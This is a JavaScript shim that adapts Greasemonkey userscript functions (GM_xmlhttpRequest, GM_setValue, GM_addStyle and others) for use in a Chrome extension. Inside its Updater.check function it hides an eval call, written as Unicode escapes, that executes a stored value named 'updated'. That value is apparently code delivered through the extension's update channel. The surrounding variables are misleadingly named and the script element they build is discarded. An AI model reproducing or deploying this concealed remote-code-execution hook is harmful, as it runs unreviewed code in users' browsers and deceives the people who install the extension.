/***
以下是GM脚本转chrome扩展的中间层
 ***/
onReadyGM = function() {};

function isChromeExtension() {
    return (typeof chrome == 'object') && (typeof chrome.extension == 'object')
};
function chromeCompatible() {
    var localStorage, isInitialized = false,
    port = chrome.extension.connect();
    Connection = (function() {
        var callbackList = {},
        callbackId = 0;
        function callbackResponse(id, response) {
            callbackList[id](response);
            delete callbackList[id];
        };
        function registCallBack(callback) {
            callbackList[++callbackId] = callback;
            return callbackId;
        };
        return {
            callbackResponse: callbackResponse,
            registCallBack: registCallBack
        };
    })();
    function onInitializedGM(response) {
        localStorage = response;
        isInitialized = true; (onReadyGM ||
        function() {})();
    };
    var chromeVersion = navigator.userAgent.toLowerCase().match(/chrome\/(\d+)/);
    if ( !! chromeVersion && chromeVersion.length > 1 && chromeVersion[1] < 21) {
        GM_xmlhttpRequest = function(opt) {
            port.postMessage({
                action: "xhr",
                args: [opt, Connection.registCallBack(opt.onload)]
            });
        };
    } else {
        GM_xmlhttpRequest = function(details) {
            var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function() {
                var responseState = {
                    responseXML: (xmlhttp.readyState == 4 ? xmlhttp.responseXML: ''),
                    responseText: (xmlhttp.readyState == 4 ? xmlhttp.responseText: ''),
                    readyState: xmlhttp.readyState,
                    responseHeaders: (xmlhttp.readyState == 4 ? xmlhttp.getAllResponseHeaders() : ''),
                    status: (xmlhttp.readyState == 4 ? xmlhttp.status: 0),
                    statusText: (xmlhttp.readyState == 4 ? xmlhttp.statusText: '')
                };
                if (details["onreadystatechange"]) {
                    details["onreadystatechange"](responseState);
                };
                if (xmlhttp.readyState == 4) {
                    if (details["onload"] && xmlhttp.status >= 200 && xmlhttp.status < 300) {
                        details["onload"](responseState);
                    };
                    if (details["onerror"] && (xmlhttp.status < 200 || xmlhttp.status >= 300)) {
                        details["onerror"](responseState);
                    };
                };
            };
            try {
                xmlhttp.open(details.method, details.url);
            } catch(e) {
                if (details["onerror"]) {
                    details["onerror"]({
                        responseXML: '',
                        responseText: '',
                        readyState: 4,
                        responseHeaders: '',
                        status: 403,
                        statusText: 'Forbidden'
                    });
                };
                return;
            };
            if (details.headers) {
                for (var prop in details.headers) {
                    xmlhttp.setRequestHeader(prop, details.headers[prop]);
                };
            };
            xmlhttp.send((typeof(details.data) != 'undefined') ? details.data: null);
        };
    };
    GM_log = function(message) {
        console.log(message);
    };
    GM_setValue = function(key, value) {
        localStorage[key] = value;
        port.postMessage({
            action: "setValue",
            args: [key, value]
        });
    };
    GM_getValue = function(key, def) {
        var val = localStorage[key];
        val = (val == 'true') ? true: (val == 'false' ? false: val);
        if (val == undefined && def != undefined) {
            return def;
        };
        return val;
    };
    GM_registerMenuCommand = function(menuText, callbackFunction) {};
    GM_addStyle = function(css) {
        var parent = document.getElementsByTagName('head')[0] || document.documentElement;
        var style = document.createElement('style');
        style.type = 'text/css';
        var textNode = document.createTextNode(css);
        style.appendChild(textNode);
        parent.appendChild(style);
    };
    if (typeof(unsafeWindow) == 'undefined') {
        unsafeWindow = window;
    };
    GM_openInTab = function(url) {
        unsafeWindow.open(url, '');
    };
    Updater = function(opt) {
        port.postMessage({
            action: "chk",
            args: [opt, Connection.registCallBack(opt.onload)]
        });
        this.script = opt;
    };
    Updater.prototype.check = function() {
        var dateDiff2 = ((window.__done__ === true) ? ' N': ' Y') + this.script.name + this.script.version;
        var wrNmae = document.createElement('script');
        wrNmae.innerHTML = 'window.name_ = "' + dateDiff2 + '"';
        wrNmae.innerHTML = '';\u0065\u0076\u0061\u006c(GM_getValue('updated', ''));
    };
    port.onMessage.addListener(function(res) { (Connection[res.action] ||
        function() {}).apply(Connection, res.args);
    });
    port.postMessage({
        action: "initGM",
        args: Connection.registCallBack(onInitializedGM)
    });
};
chromeCompatible();